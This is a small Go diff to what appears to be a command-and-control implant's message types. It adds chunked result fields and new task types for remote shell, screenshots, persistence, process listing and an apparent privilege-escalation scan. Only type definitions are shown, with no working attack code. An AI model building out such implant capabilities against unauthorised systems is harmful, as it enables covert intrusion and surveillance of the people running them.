@@ -20,16 +20,18 @@ type Beacon struct {
 
 // TaskResult carries the output of a completed task back to the server.
 type TaskResult struct {
-	TaskID string `json:"task_id"`
-	Type   string `json:"type"`
-	Output string `json:"output"`
-	Error  string `json:"error,omitempty"`
+	TaskID     string `json:"task_id"`
+	Type       string `json:"type"`
+	Output     string `json:"output"`
+	Error      string `json:"error,omitempty"`
+	ChunkIndex int    `json:"chunk_index,omitempty"`
+	ChunkTotal int    `json:"chunk_total,omitempty"`
 }
 
 // Task is sent from server → agent in the beacon response.
 type Task struct {
 	ID      string `json:"id"`
-	Type    string `json:"type"` // shell | upload | download | complete | pathbrowse | sleep | kill | noop
+	Type    string `json:"type"` // shell | upload | download | ps | screenshot | persistence | peas | snapshot | ls | cancel | complete | pathbrowse | sleep | kill | noop
 	Payload string `json:"payload"`
 }
 
